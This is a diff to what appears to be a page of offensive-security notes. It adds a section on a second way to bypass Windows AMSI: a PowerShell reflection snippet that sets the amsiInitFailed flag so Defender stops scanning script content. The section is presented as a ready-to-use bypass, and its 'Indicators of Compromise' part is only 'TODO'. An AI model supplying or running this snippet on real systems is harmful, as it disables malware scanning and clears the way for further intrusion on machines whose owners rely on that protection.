@@ -169,6 +169,17 @@ foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*Context'){$c=
 <p><img src="./images/Pasted%20image%2020230707132744.png" alt="Bypass AMSI" /></p>
 <h4 id="indicators-of-compromise"><a class="header" href="#indicators-of-compromise">Indicators of Compromise</a></h4>
 <p>TODO</p>
+<h3 id="method-2---telling-amsi-that-init-failed"><a class="header" href="#method-2---telling-amsi-that-init-failed">Method 2 - Telling AMSI that init Failed</a></h3>
+<p>Similar to method 1, only powershell is needed for this technique. Instead of corrupting the AMSI context pointer, it's possible to convince AMSI that it's initialization failed.</p>
+<p>Use the following powershell to bypass AMSI:</p>
+<pre><code class="language-powershell">foreach($x in [Ref].Assembly.GetTypes()){if($x.Name -like '*iUtils'){$a=$x}}
+foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*iInitFailed'){$i=$x}}
+$i.SetValue($null, $true)
+</code></pre>
+<p>Now the 'amsiutils' test string should not trigger defender:</p>
+<p>![[Pasted image 20230707133543.png]]</p>
+<h4 id="indicators-of-compromise-1"><a class="header" href="#indicators-of-compromise-1">Indicators of Compromise</a></h4>
+<p>TODO</p>
 
                     </main>
 
